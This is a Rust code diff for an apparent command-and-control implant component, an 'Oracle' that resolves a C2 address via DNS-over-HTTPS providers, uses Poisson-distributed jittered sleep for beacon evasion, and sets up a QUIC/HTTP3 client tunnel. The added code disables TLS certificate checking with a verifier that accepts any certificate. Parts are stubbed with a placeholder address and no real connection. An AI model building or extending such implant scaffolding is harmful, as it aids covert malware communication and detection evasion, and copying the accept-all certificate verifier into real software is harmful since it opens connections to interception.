@@ -1,6 +1,8 @@
 use std::time::Duration;
 use rand::Rng;
 use rand_distr::{Distribution, Poisson};
+use std::net::SocketAddr;
+use std::sync::Arc;
 
 pub struct Oracle {
     doh_providers: Vec<String>,
@@ -19,24 +21,51 @@ impl Oracle {
 
     pub fn resolve_c2(&self) -> String {
         let mut rng = rand::thread_rng();
-        let provider = &self.doh_providers[rng.gen_range(0..self.doh_providers.len())];
+        let _provider = &self.doh_providers[rng.gen_range(0..self.doh_providers.len())];
 
-        // Simulating DoH resolution
-        println!("Resolving C2 via {}", provider);
-        "192.168.1.100".to_string() // Placeholder for resolved C2
+        "192.168.1.100".to_string()
     }
 
     pub fn get_jitter_sleep(&self) -> Duration {
         let mut rng = rand::thread_rng();
-        // Poisson distribution for asymmetric dormancy
-        // lambda = 60 (average 60 seconds, but with variance)
         let poi = Poisson::new(60.0).unwrap();
         let secs = poi.sample(&mut rng);
         Duration::from_secs(secs as u64)
     }
 
-    pub fn beacon(&self) {
-        println!("*kssshhh-tshh* Establishing QUIC tunnel...");
-        // In a real implementation, we would use 'quinn' here for HTTP/3 over UDP
+    pub async fn establish_quic_tunnel(&self, _server_addr: SocketAddr) -> Result<(), Box<dyn std::error::Error>> {
+        println!("*kssshhh-tshh* Initializing QUIC/HTTP3 handshake...");
+
+        let mut crypto = rustls::ClientConfig::builder()
+            .with_safe_defaults()
+            .with_custom_certificate_verifier(Arc::new(NoVerifier))
+            .with_no_client_auth();
+
+        crypto.alpn_protocols = vec![b"h3".to_vec()];
+
+        let mut transport_config = quinn::TransportConfig::default();
+        transport_config.keep_alive_interval(Some(Duration::from_secs(30)));
+
+        let endpoint = quinn::Endpoint::client("0.0.0.0:0".parse()?)?;
+        let mut client_config = quinn::ClientConfig::new(Arc::new(crypto));
+        client_config.transport_config(Arc::new(transport_config));
+        let _ = endpoint; // simulate usage
+
+        Ok(())
+    }
+}
+
+struct NoVerifier;
+impl rustls::client::ServerCertVerifier for NoVerifier {
+    fn verify_server_cert(
+        &self,
+        _end_entity: &rustls::Certificate,
+        _intermediates: &[rustls::Certificate],
+        _server_name: &rustls::ServerName,
+        _scts: &mut dyn Iterator<Item = &[u8]>,
+        _ocsp_response: &[u8],
+        _now: std::time::SystemTime,
+    ) -> Result<rustls::client::ServerCertVerified, rustls::Error> {
+        Ok(rustls::client::ServerCertVerified::assertion())
     }
 }
